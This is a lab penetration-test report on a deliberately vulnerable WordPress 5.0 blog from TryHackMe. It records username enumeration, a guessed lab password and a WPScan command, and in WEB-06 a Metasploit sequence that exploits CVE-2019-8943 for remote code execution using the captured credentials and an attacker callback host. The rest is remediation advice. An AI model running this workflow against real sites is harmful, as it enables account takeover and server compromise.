# Executive Security Audit & Penetration Testing Report

# CMS & News Site / Blog Security Audit

## 1. Overview

This security assessment was conducted against a vulnerable WordPress blog environment provided as part of a controlled TryHackMe security lab.

The objective was to enumerate the web application, identify security weaknesses within the WordPress installation, obtain valid user credentials through the identified weaknesses, and assess the impact of the discovered vulnerabilities.

All testing was performed against the intentionally vulnerable laboratory environment.

---

## 2. Target Information

| Item             | Details                               |
| ---------------- | ------------------------------------- |
| Application      | WordPress Blog                        |
| Target Type      | CMS / News / Blog                     |
| Environment      | Controlled Security Lab               |
| CMS Version      | WordPress 5.0                         |
| Testing Approach | Black-Box Web Application Testing     |
| Tools            | WPScan, Browser, Metasploit Framework |

---

## 3. Executive Summary

During the assessment, multiple security weaknesses were identified within the WordPress installation.

The assessment identified:

* Exposure of a predictable administration endpoint.
* Username enumeration through application responses.
* Disclosure of valid WordPress usernames.
* Weak authentication controls allowing password guessing.
* Disclosure of an outdated WordPress version.
* A known Remote Code Execution vulnerability affecting the identified version.

The combination of these weaknesses increased the attack surface of the application and allowed the assessment to progress from initial enumeration to authenticated access and ultimately exploitation of a known vulnerability.

---

# 4. Findings Summary

| ID     | Finding                                    | Severity |
| ------ | ------------------------------------------ | -------- |
| WEB-01 | WordPress Administration Endpoint Exposure | Low      |
| WEB-02 | Username Enumeration                       | Medium   |
| WEB-03 | User Information Disclosure                | Medium   |
| WEB-04 | Weak Password / Brute-Force Exposure       | High     |
| WEB-05 | Outdated WordPress Version                 | Medium   |
| WEB-06 | Remote Code Execution – CVE-2019-8943      | Critical |

---

# 5. Detailed Findings

## WEB-01 — WordPress Administration Endpoint Exposure

### Description

During the initial enumeration phase, a predictable administration endpoint was identified.

The WordPress administration functionality was accessible through:

```text
/admin
```

Exposing a predictable administrative endpoint makes the authentication interface easier to identify and can provide attackers with a direct target for subsequent authentication attacks.

### Evidence

The `/admin` endpoint was identified during application enumeration.

### Screenshot

<img width="1586" height="763" alt="1" src="https://github.com/user-attachments/assets/d2f99a69-13dd-4918-98d6-9105c4bf9382" />

### Impact

The existence of a predictable administrative endpoint does not necessarily constitute a critical vulnerability by itself.

However, when combined with username enumeration and weak authentication controls, it can significantly increase the likelihood of unauthorized access.

### Recommendation

* Restrict access to administrative functionality where possible.
* Implement strong authentication controls.
* Apply rate limiting to authentication endpoints.
* Consider network-level restrictions for administrative interfaces.
* Enable multi-factor authentication for privileged accounts.

---

# WEB-02 — Username Enumeration

### Description

The application returned distinguishable responses when an invalid username was submitted.

This behavior allowed the tester to determine information about the supplied username based on the server response.

Such behavior can be abused to identify valid accounts before conducting authentication attacks.

### Evidence

An invalid username was submitted during authentication testing, and the server response revealed information related to the supplied username.

### Screenshot

<img width="415" height="528" alt="2" src="https://github.com/user-attachments/assets/f88afe2e-cc46-4889-8838-6cde20c9e362" />


### Impact

Username enumeration can help an attacker construct a list of valid accounts.

These accounts can subsequently be targeted using password guessing, credential stuffing, or other authentication attacks.

### Recommendation

* Return generic authentication error messages.
* Avoid revealing whether a username exists.
* Implement authentication rate limiting.
* Monitor repeated failed authentication attempts.
* Enable MFA for sensitive accounts.

---

# WEB-03 — User Information Disclosure

### Description

Further enumeration of the application revealed valid WordPress usernames.

The following usernames were identified:

```text
kwheel
bjoel
```

The disclosure of valid usernames provides useful information for attackers attempting to compromise user accounts.

### Evidence

Two valid usernames were discovered during the enumeration of the application.

### Screenshot

<img width="828" height="786" alt="3" src="https://github.com/user-attachments/assets/7d028887-1569-43b9-b24a-bd2ffeb07c1c" />


### Impact

An attacker no longer needs to guess potential usernames.

The disclosed accounts can be directly targeted during authentication attacks, reducing the overall effort required to compromise an account.

### Recommendation

* Prevent unnecessary disclosure of WordPress usernames.
* Review author and user enumeration functionality.
* Avoid exposing account information through public endpoints.
* Implement strong authentication mechanisms.
* Enable MFA for privileged accounts.

---

# WEB-04 — Weak Password / Brute-Force Exposure

### Description

After identifying valid usernames, password guessing was performed against one of the discovered accounts within the controlled laboratory environment.

A valid password was successfully identified for the `kwheel` account.

The discovered credentials were:

```text
Username: kwheel
Password: cutiepie1
```

The credentials were then used to successfully authenticate to the application.

### Evidence

The authentication attempt resulted in successful access using the discovered credentials.

### Screenshot

<img width="1586" height="803" alt="4" src="https://github.com/user-attachments/assets/cc5b4dfb-db61-4f75-935f-7a5105c7eb34" />


### Impact

The use of a weak or predictable password significantly increases the risk of account compromise.

The absence of effective protections against repeated authentication attempts further increases the risk of brute-force or password-guessing attacks.

### Recommendation

* Enforce strong password requirements.
* Prevent the use of common and predictable passwords.
* Implement rate limiting.
* Implement progressive delays or account lockout controls.
* Enable multi-factor authentication.
* Monitor repeated failed login attempts.

---

# WEB-05 — Outdated WordPress Version

### Description

The target was scanned using WPScan to identify the WordPress version and gather information about the CMS deployment.

The scan identified:

```text
WordPress 5.0
```

The identified version is outdated and associated with publicly documented vulnerabilities.

### Evidence

The following command was used:

```bash
wpscan --url http://10.81.132.106/
```

The scan identified WordPress version 5.0.

### Screenshot

<img width="862" height="123" alt="5" src="https://github.com/user-attachments/assets/0ec1ee6b-304e-4f06-9401-089010d6c922" />


### Impact

Running an outdated CMS version increases the attack surface of the application.

Publicly documented vulnerabilities can allow attackers to identify and target weaknesses that affect the deployed version.

### Recommendation

* Upgrade WordPress to a supported and patched version.
* Keep plugins and themes updated.
* Remove unused plugins and themes.
* Monitor WordPress security advisories.
* Maintain a regular patch management process.

---

# WEB-06 — Remote Code Execution — CVE-2019-8943

### Description

After identifying WordPress 5.0, the installed version was investigated for known security vulnerabilities.

A known Remote Code Execution vulnerability, **CVE-2019-8943**, was identified as applicable to the vulnerable laboratory environment.

The vulnerability was subsequently tested using the Metasploit Framework.

### Exploitation

The following workflow was used during the authorized lab assessment:

```text
search cve-2019-8943
use 0
show options
set RHOSTS 10.81.132.106
set LHOST 192.168.129.192
set USERNAME kwheel
set PASSWORD cutiepie1
exploit
```

The previously discovered `kwheel` credentials were supplied to the exploit module.

The exploit was successfully executed against the vulnerable laboratory target.

### Evidence

The successful exploitation demonstrated that the vulnerable WordPress installation could be reached through the identified vulnerability.

### Screenshot

<img width="1500" height="726" alt="6" src="https://github.com/user-attachments/assets/c15df56a-b0ec-4065-84c3-4af67c6dec14" />


### Impact

Successful exploitation of a Remote Code Execution vulnerability may allow an attacker to execute commands on the underlying server.

Depending on the privileges available to the compromised process, this could potentially result in:

* Unauthorized command execution.
* Access to application data.
* Further system compromise.
* Exposure of sensitive information.
* Additional privilege escalation opportunities.

### Recommendation

* Upgrade WordPress to a supported and patched version.
* Apply security updates immediately.
* Remove unsupported CMS versions.
* Maintain an inventory of installed software and components.
* Apply the principle of least privilege.
* Monitor the server for suspicious activity.
* Perform regular vulnerability assessments.

---

# 6. Attack Chain

The assessment demonstrated how several weaknesses could be chained together:

```text
Initial Enumeration
        │
        ▼
Administration Endpoint Discovery
        │
        ▼
Username Enumeration
        │
        ▼
Valid Username Discovery
        │
        ▼
Password Guessing
        │
        ▼
Valid Credentials
        │
        ▼
WordPress Version Identification
        │
        ▼
Known Vulnerability Identification
        │
        ▼
CVE-2019-8943
        │
        ▼
Remote Code Execution
```

This attack chain demonstrates how information disclosure and weak authentication controls can facilitate exploitation of an outdated CMS.

---

# 7. Risk Assessment

The most significant risk identified during the assessment was the combination of weak authentication controls and an outdated WordPress installation affected by a known Remote Code Execution vulnerability.

The information disclosure findings provided useful information for subsequent attacks, while the weak authentication controls allowed valid credentials to be obtained.

The outdated WordPress version then exposed the application to a known vulnerability that was successfully exploited in the controlled laboratory environment.

### Overall Risk

**Critical**

---

# 8. Remediation Priorities

### Immediate Actions

1. Upgrade WordPress to a supported and patched version.
2. Address the vulnerability associated with CVE-2019-8943.
3. Reset weak or compromised credentials.
4. Enforce strong password policies.
5. Implement authentication rate limiting.

### Short-Term Actions

6. Mitigate username enumeration.
7. Reduce unnecessary information disclosure.
8. Protect administrative interfaces.
9. Enable MFA for privileged accounts.
10. Review installed WordPress components.

### Ongoing Security

11. Keep WordPress, plugins, and themes updated.
12. Perform regular vulnerability assessments.
13. Monitor authentication and server activity.
14. Maintain a formal security patch management process.

---

# 9. Conclusion

The assessment identified multiple weaknesses within the WordPress blog environment, ranging from information disclosure and username enumeration to weak authentication and an outdated CMS version.

The most critical finding was the successful exploitation of **CVE-2019-8943**, demonstrating the potential impact of running an outdated and vulnerable WordPress installation.

The assessment also demonstrated how several lower-impact weaknesses can be combined to form a more effective attack chain.

Addressing the identified vulnerabilities, particularly the outdated CMS version and authentication weaknesses, would significantly reduce the attack surface of the application.

---
